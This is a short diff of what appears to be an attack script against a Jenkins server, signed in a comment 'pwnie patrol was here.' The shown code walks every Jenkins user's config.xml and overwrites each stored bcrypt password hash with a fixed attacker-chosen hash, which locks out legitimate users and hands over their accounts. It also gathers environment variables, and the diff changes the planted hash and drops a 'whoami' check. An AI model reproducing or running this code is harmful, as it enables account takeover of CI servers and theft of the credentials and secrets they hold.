@@ -36,11 +36,10 @@ message = pprint.pformat(dict(envs))
 results = os.listdir('/var/lib/jenkins/users/')
 for res in results:
         for line in fileinput.FileInput("/var/lib/jenkins/users/%s/config.xml" % res,inplace=1):
-                line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$W6NEOCW5CoGrROvyDgFhzeKZi2Pu2G7kPqAaU8FI36tHPFPHzo9Bu", line )
+                line = re.sub(r"#jbcrypt:[^<]+", "#jbcrypt:$2a$10$Kp.3FcGDdUcmGCsRRsSl9ONi77HeFngCryKCnupL5pPUPYrM9gi3y", line )
                 print line,
 
 message = 'using jenkins: %s ' % str(results)
-print os.system('whoami')
 """
 # pwnie patrol was here.
 try:
